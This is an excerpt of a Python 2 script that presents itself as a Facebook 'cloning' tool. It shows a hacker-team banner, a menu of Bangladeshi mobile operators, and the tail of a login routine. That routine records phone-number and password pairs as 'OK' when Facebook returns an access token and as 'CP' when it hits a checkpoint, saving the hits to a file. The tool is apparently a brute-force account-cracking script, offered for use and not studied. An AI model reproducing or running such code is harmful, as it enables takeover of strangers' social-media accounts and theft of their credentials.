...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO J33T M0ND0L WORLDS -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
...
logo = '\x1b[1;96m--------------------------------------------------\n      ---> Create by -> J33T M0ND0L <--- \n\x1b[1;96m-------------------------------------------------- \n\x1b[1;96m     Facebook  -> Sonatoni-hacker-boys-team \x1b[00m\n\x1b[1;96m--------------------------------------------------\n    ---> Github -> JEET-707 <--- \n\x1b[1;96m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;96mAUTHOR  : J33T M0ND0 '
    print '\x1b[1;96mYOUTUBE: JEET'
    print '\x1b[1;96mGITHUB  : github.com/J33T-707'
    print ''
    print 50* '-'
    print '\x1b[1;92m--------------------------------------------------'
    print
    print '\x1b[1;96mBANGLADESH ALL OPERETOR NETWORK'
    print
    print '\x1b[1;96m[1]   GRAMEEN PHONE(BEST)'
    print '\x1b[1;91m[2]  AIRTEL(5G-ST)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;93m[4]  BANGLALINK(NEW)'
    print '\x1b[1;94m[5]  ROBI(5G-ST)'
    print '\x1b[1;95m[6]  TELETALK(5G-ST)'
    print '\x1b[1;96m[7]  EXIT'
    print '\x1b[1;96m[0]  EXIT'
    print '\x1b[1;92m--------------------------------------------------'
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[J33T_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[J33T_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [Login After7 Days]\x1b[0m \n'
